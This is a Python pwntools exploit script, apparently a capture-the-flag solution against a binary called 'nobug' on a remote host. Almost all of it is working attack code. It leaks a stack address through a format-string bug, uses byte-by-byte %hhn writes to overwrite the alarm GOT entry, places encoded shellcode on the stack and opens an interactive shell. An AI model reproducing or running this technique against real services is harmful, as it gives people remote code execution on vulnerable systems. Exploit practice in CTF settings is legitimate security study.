from pwn import *
from base64 import *
#p = process('./nobug')
p = remote('180.76.178.48', 8888)
payload  = '' 
payload += '%20$x'
print payload
payload = b64encode(payload)
raw_input()
p.sendline(payload)
off = int(p.recvline(), 16)
print 'off:',hex(off)
stack = off
off = off&0xff
print 'off:',hex(off)

def b_write(addr_r, cont):
	for j in range(4):
		addr = addr_r
		for i in range(4):
			mid = off+i
			delta = mid
			payload  = '' 
			if delta<8:
				payload += 'a'*delta
			else:
				payload += '%'+str(delta)+'x'
			payload += '%12$hhn'
			#payload += '----%4$x----'
			print payload
			payload = b64encode(payload)
			p.sendline(payload)	#change mid_p
			#p.interactive()
						
			delta = addr & 0xff
			addr = addr>>8
			payload  = '' 
			if delta<8:
				payload += 'a'*delta
			else:
				payload += '%'+str(delta)+'x'
			payload += '%20$hhn'
			print payload
			payload = b64encode(payload)
			p.sendline(payload)
		
		delta = cont & 0xff
		cont = cont >> 8
		payload  = '' 
		if delta<8:
			payload += 'a'*delta
		else:
			payload += '%'+str(delta)+'x'
		payload += '%28$hhn'
		payload += 'addr cont: %28$x'
		print 'payload:',payload
		payload = b64encode(payload)
		p.sendline(payload)
		#addr_r += 1

def write(addr_r, cont):
	for j in range(4):
		addr = addr_r
		for i in range(4):
			mid = off+i
			delta = mid
			payload  = '' 
			if delta<8:
				payload += 'a'*delta
			else:
				payload += '%'+str(delta)+'x'
			payload += '%12$hhn'
			#payload += '----%4$x----'
			print payload
			payload = b64encode(payload)
			p.sendline(payload)	#change mid_p
			#p.interactive()
						
			delta = addr & 0xff
			addr = addr>>8
			payload  = '' 
			if delta<8:
				payload += 'a'*delta
			else:
				payload += '%'+str(delta)+'x'
			payload += '%20$hhn'
			print payload
			payload = b64encode(payload)
			p.sendline(payload)
		
		delta = cont & 0xff
		cont = cont >> 8
		payload  = '' 
		if delta<8:
			payload += 'a'*delta
		else:
			payload += '%'+str(delta)+'x'
		payload += '%28$hhn'
		payload += 'addr cont: %28$x'
		print payload
		payload = b64encode(payload)
		p.sendline(payload)
		addr_r += 1

shellcode_addr = stack+0x80
log.success(hex(shellcode_addr))
raw_input('alarm')
write(0x804a014, shellcode_addr)		#chang alarm

#write shellcode
#shellcode = "\xb0\x46\x31\xc0\xcd\x80\xeb\x07\x5b\x31\xc0\xb0\x0b\xcd\x80\x31\xc9\xe8\xf2\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68"
shellcode = "\xeb\x16\x5e\x8a\x06\x31\xc9\x8a\x5c\x0e\x01\x80\xeb\x07\x88\x1c\x0e\x41\x38\xc8\x75\xf1\xeb\x05\xe8\xe5\xff\xff\xff\x18\x38\xc7\x57\x6f\x36\x36\x7a\x6f\x6f\x36\x69\x70\x75\x90\xea\x38\xd0\x90\xd1\x71\x12\x5f\xd4\x87"

shellcode = shellcode.ljust((len(shellcode)/4+1)*4, '\x90')
for i in range(len(shellcode)/4):
	tmp = shellcode[4*i:4*i+4]
	tmp = u32(tmp)
	write(shellcode_addr+4*i,tmp)
	#raw_input()


addr = stack - 0x98 + 0x5c
print 'addr:',hex(addr)
b_write(addr, 0xaabbcced)
p.interactive()

